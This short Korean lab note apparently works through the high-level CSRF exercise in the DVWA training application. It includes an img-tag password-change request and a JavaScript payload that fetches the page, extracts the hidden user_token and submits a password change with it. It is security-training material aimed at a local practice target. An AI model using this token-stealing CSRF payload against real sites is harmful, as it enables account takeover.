high
1. 비밀번호 변경 & 변경 확인

2. 비밀번호 변경 url만 요청
<img src="http://localhost/dvwa/vulnerabilities/csrf/?password_new=qwas&password_conf=qwas&Change=Change"/>
> 정상적인 요청과 비정상적인 요청 비교
> user_token이 추가되어 있음
> user_token을 랜덤으로 넣어봄 >> 안됨

3. 코드에 있는 히든 user_token의 값을 가져올 스크립트 삽입
콘솔로 추출이 되는지 확인
document.querySelector('input[name="user_token"]').value;

스크립트
<script>
// 토큰을 추출하기 위한 요청
fetch('http://localhost/dvwa/vulnerabilities/csrf/index.php/')
    .then(response => response.text())
    .then(html => {
        // user_token 추출
        const parser = new DOMParser();
        const doc = parser.parseFromString(html, 'text/html');
        const token = doc.querySelector('input[name="user_token"]').value;

        // 비밀번호 변경 URL 구성
        const passwordChangeUrl = `http://localhost/dvwa/vulnerabilities/csrf/index.php/?password_new=1234&password_conf=1234&user_token=${token}&Change=Change`;

        // 공격 실행
        fetch(passwordChangeUrl);
    })
    .catch(err => console.error('Token extraction failed:', err));
</script>
